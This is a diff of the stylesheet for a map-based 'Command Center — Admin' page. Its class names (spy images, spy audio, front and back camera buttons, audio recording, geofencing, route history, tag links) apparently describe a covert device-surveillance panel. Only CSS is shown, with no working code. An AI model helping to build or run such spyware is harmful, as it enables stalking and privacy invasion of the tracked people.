@@ -1,19 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Command Center — Admin</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@500;700&display=swap"
+        rel="stylesheet">
     <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
         :root {
             --bg: #060812;
             --panel: rgba(8, 12, 25, 0.96);
-            --surface: rgba(255,255,255,0.04);
-            --border: rgba(255,255,255,0.07);
-            --border-accent: rgba(56,189,248,0.2);
+            --surface: rgba(255, 255, 255, 0.04);
+            --border: rgba(255, 255, 255, 0.07);
+            --border-accent: rgba(56, 189, 248, 0.2);
             --accent: #38bdf8;
             --accent2: #818cf8;
             --green: #10b981;
@@ -23,727 +33,1719 @@
             --pink: #ec4899;
             --text: #f1f5f9;
             --muted: #64748b;
-            --panel-w: 350px;
+            --panel-w: 360px;
         }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); overflow: hidden; height: 100vh; width: 100vw; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
 
         /* Map */
-        #map { position: absolute; inset: 0; z-index: 1; }
-        .leaflet-tile-pane { filter: brightness(0.82) saturate(1.15) hue-rotate(5deg); }
-        .leaflet-control-zoom a { background: rgba(10,15,30,0.9) !important; color: var(--accent) !important; border-color: var(--border-accent) !important; }
-        .leaflet-control-layers { background: rgba(8,12,25,0.95) !important; border: 1px solid var(--border-accent) !important; border-radius: 10px !important; padding: 8px !important; }
-        .leaflet-control-layers label, .leaflet-control-layers-base span { color: var(--text) !important; font-size: 13px; }
+        #map {
+            position: absolute;
+            inset: 0;
+            z-index: 1;
+        }
+
+        .leaflet-tile-pane {
+            filter: brightness(0.82) saturate(1.15) hue-rotate(5deg);
+        }
+
+        .leaflet-control-zoom a {
+            background: rgba(10, 15, 30, 0.9) !important;
+            color: var(--accent) !important;
+            border-color: var(--border-accent) !important;
+        }
+
+        .leaflet-control-layers {
+            background: rgba(8, 12, 25, 0.95) !important;
+            border: 1px solid var(--border-accent) !important;
+            border-radius: 10px !important;
+            padding: 8px !important;
+        }
+
+        .leaflet-control-layers label,
+        .leaflet-control-layers-base span {
+            color: var(--text) !important;
+            font-size: 13px;
+        }
 
         /* Show Panel Btn */
         #showPanelBtn {
-            display: none; position: absolute; top: 16px; left: 16px; z-index: 1000;
-            background: rgba(8,12,25,0.92); color: var(--accent);
-            border: 1px solid var(--border-accent); padding: 10px 16px; border-radius: 10px;
-            cursor: pointer; font-weight: 600; font-size: 13px;
-            backdrop-filter: blur(14px); box-shadow: 0 4px 20px rgba(0,0,0,0.5); transition: 0.2s;
+            display: none;
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            z-index: 1000;
+            background: rgba(8, 12, 25, 0.92);
+            color: var(--accent);
+            border: 1px solid var(--border-accent);
+            padding: 10px 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 13px;
+            backdrop-filter: blur(14px);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            transition: 0.2s;
         }
-        #showPanelBtn:hover { background: rgba(56,189,248,0.1); }
 
-        /* Scan Line Effect on map corner */
+        #showPanelBtn:hover {
+            background: rgba(56, 189, 248, 0.1);
+        }
+
+        /* HUD chips */
         .map-hud {
-            position: absolute; bottom: 20px; left: calc(var(--panel-w) + 20px); z-index: 500;
-            display: flex; gap: 10px;
+            position: absolute;
+            bottom: 20px;
+            left: calc(var(--panel-w) + 20px);
+            z-index: 500;
+            display: flex;
+            gap: 10px;
         }
+
         .hud-chip {
-            background: rgba(8,12,25,0.88); backdrop-filter: blur(14px);
-            border: 1px solid var(--border-accent); border-radius: 8px;
-            padding: 6px 12px; font-size: 11px; color: var(--muted);
-            display: flex; align-items: center; gap: 6px;
+            background: rgba(8, 12, 25, 0.88);
+            backdrop-filter: blur(14px);
+            border: 1px solid var(--border-accent);
+            border-radius: 8px;
+            padding: 6px 12px;
+            font-size: 11px;
+            color: var(--muted);
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
-        .hud-chip .val { color: var(--text); font-weight: 600; font-family: 'Orbitron', monospace; font-size: 12px; }
+
+        .hud-chip .val {
+            color: var(--text);
+            font-weight: 600;
+            font-family: 'Orbitron', monospace;
+            font-size: 12px;
+        }
 
         /* Side Panel */
         .panel {
-            position: absolute; top: 0; left: 0;
-            width: var(--panel-w); height: 100%; z-index: 900;
-            background: var(--panel); border-right: 1px solid var(--border-accent);
-            backdrop-filter: blur(24px); display: flex; flex-direction: column;
-            overflow: hidden; box-shadow: 6px 0 50px rgba(0,0,0,0.7);
-            transition: transform 0.35s cubic-bezier(0.4,0,0.2,1);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: var(--panel-w);
+            height: 100%;
+            z-index: 900;
+            background: var(--panel);
+            border-right: 1px solid var(--border-accent);
+            backdrop-filter: blur(24px);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 6px 0 50px rgba(0, 0, 0, 0.7);
+            transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
         }
-        .panel.hidden { transform: translateX(-100%); }
+
+        .panel.hidden {
+            transform: translateX(-100%);
+        }
 
         /* Panel Header */
         .panel-header {
-            padding: 16px 18px 14px;
+            padding: 14px 16px 12px;
             border-bottom: 1px solid var(--border);
             flex-shrink: 0;
-            background: linear-gradient(180deg, rgba(56,189,248,0.06) 0%, transparent 100%);
+            background: linear-gradient(180deg, rgba(56, 189, 248, 0.06) 0%, transparent 100%);
         }
+
         .panel-brand {
-            font-family: 'Orbitron', sans-serif; font-size: 12px; font-weight: 700;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            font-weight: 700;
             letter-spacing: 2.5px;
             background: linear-gradient(135deg, var(--accent), var(--accent2));
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
-            margin-bottom: 10px; display: flex; align-items: center; gap: 8px;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .brand-ping { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 8px var(--accent); animation: orbitPing 2s ease-in-out infinite; }
-        @keyframes orbitPing { 0%,100%{transform:scale(1);opacity:1} 50%{transform:scale(1.5);opacity:0.5} }
 
-        .panel-status-row { display: flex; align-items: center; justify-content: space-between; }
-        .status-indicator { display: flex; align-items: center; gap: 7px; }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--muted); transition: all 0.4s; }
-        .status-dot.live { background: var(--green); box-shadow: 0 0 12px var(--green); animation: liveBlink 1.5s ease-in-out infinite; }
-        .status-dot.offline { background: var(--red); box-shadow: 0 0 10px var(--red); }
-        @keyframes liveBlink { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.7)} }
-        .status-text { font-weight: 700; font-size: 12px; color: var(--muted); }
-        .status-text.live { color: var(--green); }
-        .status-text.offline { color: var(--red); }
-        .status-time { font-size: 10px; color: var(--muted); font-variant-numeric: tabular-nums; }
-        .hide-btn { background: transparent; border: 1px solid rgba(100,116,139,0.3); color: var(--muted); padding: 4px 9px; border-radius: 6px; cursor: pointer; font-size: 11px; font-weight: 600; transition: 0.2s; }
-        .hide-btn:hover { border-color: var(--red); color: var(--red); }
+        .brand-ping {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent);
+            box-shadow: 0 0 8px var(--accent);
+            animation: orbitPing 2s ease-in-out infinite;
+        }
+
+        @keyframes orbitPing {
+
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 1
+            }
+
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5
+            }
+        }
+
+        .panel-status-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .hide-btn {
+            background: transparent;
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            color: var(--muted);
+            padding: 4px 9px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: 600;
+            transition: 0.2s;
+        }
+
+        .hide-btn:hover {
+            border-color: var(--red);
+            color: var(--red);
+        }
+
+        /* ── USER LIST TAB ── */
+        .user-list-wrap {
+            flex-shrink: 0;
+            border-bottom: 1px solid var(--border);
+            padding: 10px 12px;
+            background: rgba(0, 0, 0, 0.25);
+        }
+
+        .ul-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .ul-title {
+            font-size: 9px;
+            font-weight: 700;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .ul-count {
+            font-size: 9px;
+            font-weight: 700;
+            color: var(--accent);
+            background: rgba(56, 189, 248, 0.1);
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            padding: 2px 7px;
+            border-radius: 99px;
+        }
+
+        .user-tabs {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .user-tab {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 5px 10px 5px 8px;
+            border-radius: 8px;
+            cursor: pointer;
+            border: 1px solid var(--border);
+            background: var(--surface);
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--muted);
+            transition: all 0.2s;
+            position: relative;
+        }
+
+        .user-tab:hover {
+            border-color: var(--border-accent);
+            color: var(--text);
+        }
+
+        .user-tab.active {
+            background: rgba(56, 189, 248, 0.12);
+            border-color: rgba(56, 189, 248, 0.4);
+            color: var(--accent);
+        }
+
+        .user-tab .tab-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: var(--muted);
+            flex-shrink: 0;
+        }
+
+        .user-tab .tab-dot.live {
+            background: var(--green);
+            box-shadow: 0 0 6px var(--green);
+            animation: liveBlink 1.5s ease-in-out infinite;
+        }
+
+        .user-tab .tab-dot.offline {
+            background: var(--red);
+        }
+
+        .user-tab .tab-serial {
+            font-family: 'Orbitron', monospace;
+            font-size: 9px;
+            font-weight: 700;
+            background: rgba(56, 189, 248, 0.15);
+            color: var(--accent);
+            padding: 1px 5px;
+            border-radius: 4px;
+        }
+
+        .user-tab.active .tab-serial {
+            background: rgba(56, 189, 248, 0.25);
+        }
+
+        /* Add user button */
+        .add-user-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            padding: 5px 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            border: 1px dashed rgba(56, 189, 248, 0.3);
+            background: transparent;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--muted);
+            transition: all 0.2s;
+        }
+
+        .add-user-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
 
         /* Panel Body */
-        .panel-body { flex: 1; overflow-y: auto; padding: 14px; display: flex; flex-direction: column; gap: 10px; }
-        .panel-body::-webkit-scrollbar { width: 3px; }
-        .panel-body::-webkit-scrollbar-thumb { background: var(--border-accent); border-radius: 99px; }
+        .panel-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .panel-body::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .panel-body::-webkit-scrollbar-thumb {
+            background: var(--border-accent);
+            border-radius: 99px;
+        }
+
+        /* Status row */
+        .status-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 8px 12px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--muted);
+            transition: all 0.4s;
+        }
+
+        .status-dot.live {
+            background: var(--green);
+            box-shadow: 0 0 12px var(--green);
+            animation: liveBlink 1.5s ease-in-out infinite;
+        }
+
+        .status-dot.offline {
+            background: var(--red);
+            box-shadow: 0 0 10px var(--red);
+        }
+
+        @keyframes liveBlink {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1)
+            }
+
+            50% {
+                opacity: 0.4;
+                transform: scale(0.7)
+            }
+        }
+
+        .status-text {
+            font-weight: 700;
+            font-size: 12px;
+            color: var(--muted);
+        }
+
+        .status-text.live {
+            color: var(--green);
+        }
+
+        .status-text.offline {
+            color: var(--red);
+        }
+
+        .status-time {
+            font-size: 10px;
+            color: var(--muted);
+            font-variant-numeric: tabular-nums;
+            margin-left: auto;
+        }
 
         /* Address Box */
         .address-box {
-            display: flex; align-items: flex-start; gap: 8px;
-            background: rgba(16,185,129,0.07); border: 1px solid rgba(16,185,129,0.18);
-            border-radius: 10px; padding: 10px 12px; font-size: 12px; line-height: 1.7; color: #cbd5e1;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            background: rgba(16, 185, 129, 0.07);
+            border: 1px solid rgba(16, 185, 129, 0.18);
+            border-radius: 10px;
+            padding: 10px 12px;
+            font-size: 12px;
+            line-height: 1.7;
+            color: #cbd5e1;
             transition: border-color 0.3s;
         }
-        .address-box.error { background: rgba(244,63,94,0.07); border-color: rgba(244,63,94,0.2); }
-        .addr-icon { font-size: 15px; flex-shrink: 0; margin-top: 2px; }
+
+        .address-box.error {
+            background: rgba(244, 63, 94, 0.07);
+            border-color: rgba(244, 63, 94, 0.2);
+        }
+
+        .addr-icon {
+            font-size: 15px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
 
         /* Section */
-        .section { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 12px; }
-        .section-title { font-size: 9px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 9px; display: flex; align-items: center; gap: 5px; }
-        .section-title::after { content:''; flex:1; height:1px; background:var(--border); }
+        .section {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 12px;
+        }
+
+        .section-title {
+            font-size: 9px;
+            font-weight: 700;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 9px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .section-title::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border);
+        }
 
         /* Info Rows */
-        .info-grid { display: flex; flex-direction: column; gap: 5px; }
-        .info-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 9px; background: rgba(0,0,0,0.2); border-radius: 7px; font-size: 11.5px; }
-        .info-label { color: var(--muted); font-weight: 500; }
-        .info-value { font-weight: 600; color: var(--text); text-align: right; max-width: 62%; word-break: break-all; font-size: 11px; }
-        .info-value.accent { color: var(--accent); font-family: 'Orbitron', monospace; font-size: 10.5px; }
-        .info-value.green { color: var(--green); }
-        .info-value.orange { color: var(--orange); }
+        .info-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 9px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 7px;
+            font-size: 11.5px;
+        }
+
+        .info-label {
+            color: var(--muted);
+            font-weight: 500;
+        }
+
+        .info-value {
+            font-weight: 600;
+            color: var(--text);
+            text-align: right;
+            max-width: 62%;
+            word-break: break-all;
+            font-size: 11px;
+        }
+
+        .info-value.accent {
+            color: var(--accent);
+            font-family: 'Orbitron', monospace;
+            font-size: 10.5px;
+        }
+
+        .info-value.green {
+            color: var(--green);
+        }
+
+        .info-value.orange {
+            color: var(--orange);
+        }
 
         /* Movement Cards */
-        .move-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; }
-        .move-card { background: rgba(0,0,0,0.3); border-radius: 9px; padding: 9px 6px; text-align: center; border: 1px solid var(--border); }
-        .move-card .mv { font-family: 'Orbitron', sans-serif; font-size: 16px; font-weight: 700; color: var(--accent); }
-        .move-card .ml { font-size: 9px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
-        .speed-track { height: 3px; background: var(--border); border-radius: 99px; overflow: hidden; margin-top: 8px; }
-        .speed-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--green), var(--accent)); border-radius: 99px; transition: width 1.2s ease; }
+        .move-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+        }
+
+        .move-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 9px;
+            padding: 9px 6px;
+            text-align: center;
+            border: 1px solid var(--border);
+        }
+
+        .move-card .mv {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--accent);
+        }
+
+        .move-card .ml {
+            font-size: 9px;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 2px;
+        }
+
+        .speed-track {
+            height: 3px;
+            background: var(--border);
+            border-radius: 99px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+
+        .speed-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--green), var(--accent));
+            border-radius: 99px;
+            transition: width 1.2s ease;
+        }
 
         /* Buttons */
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 7px; }
-        .btn-grid .full { grid-column: 1 / -1; }
-        .action-btn {
-            display: flex; align-items: center; justify-content: center; gap: 5px;
-            padding: 9px 10px; border: none; border-radius: 9px; font-size: 11.5px;
-            font-weight: 700; cursor: pointer; color: white;
-            transition: transform 0.15s, box-shadow 0.2s; letter-spacing: 0.2px;
-            position: relative; overflow: hidden;
+        .btn-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 7px;
         }
-        .action-btn::before { content:''; position:absolute; inset:0; background:rgba(255,255,255,0.12); opacity:0; transition:opacity 0.2s; }
-        .action-btn:hover::before { opacity: 1; }
-        .action-btn:active { transform: scale(0.94); }
-        .btn-ring { background: linear-gradient(135deg, #ef4444, #b91c1c); box-shadow: 0 3px 12px rgba(239,68,68,0.25); }
-        .btn-front { background: linear-gradient(135deg, #8b5cf6, #6d28d9); box-shadow: 0 3px 12px rgba(139,92,246,0.25); }
-        .btn-back { background: linear-gradient(135deg, #6366f1, #4338ca); box-shadow: 0 3px 12px rgba(99,102,241,0.25); }
-        .btn-audio { background: linear-gradient(135deg, #ec4899, #be185d); box-shadow: 0 3px 12px rgba(236,72,153,0.25); }
-        .btn-audio-long { background: linear-gradient(135deg, #f43f5e, #9f1239); box-shadow: 0 3px 12px rgba(244,63,94,0.25); }
-        .btn-geo { background: linear-gradient(135deg, #f59e0b, #b45309); box-shadow: 0 3px 12px rgba(245,158,11,0.25); }
-        .btn-geo.on { background: linear-gradient(135deg, #10b981, #047857); box-shadow: 0 3px 12px rgba(16,185,129,0.25); }
-        .btn-clear-route { background: linear-gradient(135deg, #475569, #334155); box-shadow: none; }
+
+        .btn-grid .full {
+            grid-column: 1 / -1;
+        }
+
+        .action-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            padding: 9px 10px;
+            border: none;
+            border-radius: 9px;
+            font-size: 11.5px;
+            font-weight: 700;
+            cursor: pointer;
+            color: white;
+            transition: transform 0.15s, box-shadow 0.2s;
+            letter-spacing: 0.2px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.12);
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+
+        .action-btn:hover::before {
+            opacity: 1;
+        }
+
+        .action-btn:active {
+            transform: scale(0.94);
+        }
+
+        .btn-ring {
+            background: linear-gradient(135deg, #ef4444, #b91c1c);
+            box-shadow: 0 3px 12px rgba(239, 68, 68, 0.25);
+        }
+
+        .btn-front {
+            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
+            box-shadow: 0 3px 12px rgba(139, 92, 246, 0.25);
+        }
+
+        .btn-back {
+            background: linear-gradient(135deg, #6366f1, #4338ca);
+            box-shadow: 0 3px 12px rgba(99, 102, 241, 0.25);
+        }
+
+        .btn-audio {
+            background: linear-gradient(135deg, #ec4899, #be185d);
+            box-shadow: 0 3px 12px rgba(236, 72, 153, 0.25);
+        }
+
+        .btn-audio-long {
+            background: linear-gradient(135deg, #f43f5e, #9f1239);
+            box-shadow: 0 3px 12px rgba(244, 63, 94, 0.25);
+        }
+
+        .btn-geo {
+            background: linear-gradient(135deg, #f59e0b, #b45309);
+            box-shadow: 0 3px 12px rgba(245, 158, 11, 0.25);
+        }
+
+        .btn-geo.on {
+            background: linear-gradient(135deg, #10b981, #047857);
+            box-shadow: 0 3px 12px rgba(16, 185, 129, 0.25);
+        }
+
+        .btn-clear-route {
+            background: linear-gradient(135deg, #475569, #334155);
+            box-shadow: none;
+        }
+
+        /* Tag Link Generator */
+        .tag-gen-box {
+            background: rgba(56, 189, 248, 0.05);
+            border: 1px solid rgba(56, 189, 248, 0.15);
+            border-radius: 10px;
+            padding: 10px 12px;
+        }
+
+        .tag-gen-title {
+            font-size: 9px;
+            font-weight: 700;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+        }
+
+        .tag-gen-row {
+            display: flex;
+            gap: 6px;
+        }
+
+        .tag-input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border);
+            color: var(--text);
+            border-radius: 7px;
+            padding: 7px 10px;
+            font-size: 12px;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+        }
+
+        .tag-input:focus {
+            border-color: var(--border-accent);
+        }
+
+        .tag-gen-btn {
+            padding: 7px 12px;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            border: none;
+            border-radius: 7px;
+            color: white;
+            font-size: 11px;
+            font-weight: 700;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: opacity 0.2s;
+        }
+
+        .tag-gen-btn:hover {
+            opacity: 0.85;
+        }
+
+        .tag-link-out {
+            margin-top: 7px;
+            font-size: 10px;
+            color: var(--accent);
+            word-break: break-all;
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 6px;
+            padding: 6px 8px;
+            cursor: pointer;
+            display: none;
+        }
+
+        .tag-link-out.show {
+            display: block;
+        }
 
         /* Media Boxes */
-        .media-section { display: none; background: var(--surface); border: 1px dashed var(--border-accent); border-radius: 12px; padding: 12px; }
-        .media-section.visible { display: block; }
-        .media-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
-        .media-title { font-size: 10px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: 1.5px; }
-        .media-badge { padding: 2px 7px; border-radius: 99px; font-size: 9.5px; font-weight: 700; }
-        .badge-wait { background: rgba(245,158,11,0.15); color: var(--orange); }
-        .badge-ok { background: rgba(16,185,129,0.15); color: var(--green); }
-        .badge-err { background: rgba(244,63,94,0.15); color: var(--red); }
+        .media-section {
+            display: none;
+            background: var(--surface);
+            border: 1px dashed var(--border-accent);
+            border-radius: 12px;
+            padding: 12px;
+        }
 
-        .spy-img { width: 100%; border-radius: 7px; display: none; border: 1px solid var(--border); margin-top: 6px; }
-        .spy-img.show { display: block; }
-        .spy-audio { width: 100%; display: none; margin-top: 7px; border-radius: 7px; }
-        .spy-audio.show { display: block; }
-        .media-btns { display: flex; gap: 5px; margin-top: 8px; }
-        .media-btns a, .media-btns button { flex:1; padding:6px; font-size:11px; font-weight:700; border:none; border-radius:7px; cursor:pointer; text-align:center; text-decoration:none; transition:opacity 0.2s; }
-        .m-dl { background: rgba(16,185,129,0.15); color: var(--green); border: 1px solid rgba(16,185,129,0.25) !important; }
-        .m-del { background: rgba(244,63,94,0.15); color: var(--red); border: 1px solid rgba(244,63,94,0.25) !important; }
-        .media-btns a:hover, .media-btns button:hover { opacity: 0.75; }
+        .media-section.visible {
+            display: block;
+        }
 
-        /* Route History mini list */
-        .route-log { max-height: 80px; overflow-y: auto; margin-top: 6px; }
-        .route-log-item { font-size: 10px; color: var(--muted); padding: 3px 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; }
-        .route-log-item:last-child { border-bottom: none; }
+        .media-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .media-title {
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+
+        .media-badge {
+            padding: 2px 7px;
+            border-radius: 99px;
+            font-size: 9.5px;
+            font-weight: 700;
+        }
+
+        .badge-wait {
+            background: rgba(245, 158, 11, 0.15);
+            color: var(--orange);
+        }
+
+        .badge-ok {
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--green);
+        }
+
+        .badge-err {
+            background: rgba(244, 63, 94, 0.15);
+            color: var(--red);
+        }
+
+        .spy-img {
+            width: 100%;
+            border-radius: 7px;
+            display: none;
+            border: 1px solid var(--border);
+            margin-top: 6px;
+        }
+
+        .spy-img.show {
+            display: block;
+        }
+
+        .spy-audio {
+            width: 100%;
+            display: none;
+            margin-top: 7px;
+            border-radius: 7px;
+        }
+
+        .spy-audio.show {
+            display: block;
+        }
+
+        .media-btns {
+            display: flex;
+            gap: 5px;
+            margin-top: 8px;
+        }
+
+        .media-btns a,
+        .media-btns button {
+            flex: 1;
+            padding: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            border: none;
+            border-radius: 7px;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: opacity 0.2s;
+        }
+
+        .m-dl {
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--green);
+            border: 1px solid rgba(16, 185, 129, 0.25) !important;
+        }
+
+        .m-del {
+            background: rgba(244, 63, 94, 0.15);
+            color: var(--red);
+            border: 1px solid rgba(244, 63, 94, 0.25) !important;
+        }
+
+        .media-btns a:hover,
+        .media-btns button:hover {
+            opacity: 0.75;
+        }
+
+        /* Route History */
+        .route-log {
+            max-height: 80px;
+            overflow-y: auto;
+            margin-top: 6px;
+        }
+
+        .route-log-item {
+            font-size: 10px;
+            color: var(--muted);
+            padding: 3px 0;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .route-log-item:last-child {
+            border-bottom: none;
+        }
 
         /* Map Marker */
-        .smart-marker { text-align: center; font-size: 30px; filter: drop-shadow(0 2px 8px rgba(0,0,0,0.7)); transition: transform 0.4s; }
+        .smart-marker {
+            text-align: center;
+            font-size: 30px;
+            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.7));
+            transition: transform 0.4s;
+        }
 
         /* Toast */
         #toast {
-            position: fixed; bottom: 20px; right: 20px; z-index: 9999;
-            background: rgba(8,12,25,0.96); border: 1px solid var(--border-accent);
-            color: var(--text); padding: 11px 16px; border-radius: 11px;
-            font-size: 13px; font-weight: 500; backdrop-filter: blur(16px);
-            box-shadow: 0 8px 32px rgba(0,0,0,0.6); display: none;
-            animation: toastIn 0.3s ease; max-width: 260px; line-height: 1.4;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 9999;
+            background: rgba(8, 12, 25, 0.96);
+            border: 1px solid var(--border-accent);
+            color: var(--text);
+            padding: 11px 16px;
+            border-radius: 11px;
+            font-size: 13px;
+            font-weight: 500;
+            backdrop-filter: blur(16px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+            display: none;
+            animation: toastIn 0.3s ease;
+            max-width: 260px;
+            line-height: 1.4;
         }
-        #toast.success { border-color: rgba(16,185,129,0.35); }
-        #toast.error { border-color: rgba(244,63,94,0.35); }
-        #toast.info { border-color: rgba(56,189,248,0.35); }
-        @keyframes toastIn { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
+
+        #toast.success {
+            border-color: rgba(16, 185, 129, 0.35);
+        }
+
+        #toast.error {
+            border-color: rgba(244, 63, 94, 0.35);
+        }
+
+        #toast.info {
+            border-color: rgba(56, 189, 248, 0.35);
+        }
+
+        @keyframes toastIn {
+            from {
+                opacity: 0;
+                transform: translateY(16px)
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
 
         /* Geofence Alert */
         #geoAlert {
-            display: none; position: fixed; top: 50%; left: 50%;
-            transform: translate(-50%,-50%); z-index: 9999;
-            background: rgba(8,12,25,0.98); border: 2px solid var(--red);
-            border-radius: 18px; padding: 28px 24px; text-align: center;
-            backdrop-filter: blur(20px); box-shadow: 0 0 60px rgba(244,63,94,0.35);
-            max-width: 300px; width: 90%; animation: alertAppear 0.4s ease;
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+            background: rgba(8, 12, 25, 0.98);
+            border: 2px solid var(--red);
+            border-radius: 18px;
+            padding: 28px 24px;
+            text-align: center;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 0 60px rgba(244, 63, 94, 0.35);
+            max-width: 300px;
+            width: 90%;
+            animation: alertAppear 0.4s ease;
         }
-        @keyframes alertAppear { from{transform:translate(-50%,-50%) scale(0.8);opacity:0} to{transform:translate(-50%,-50%) scale(1);opacity:1} }
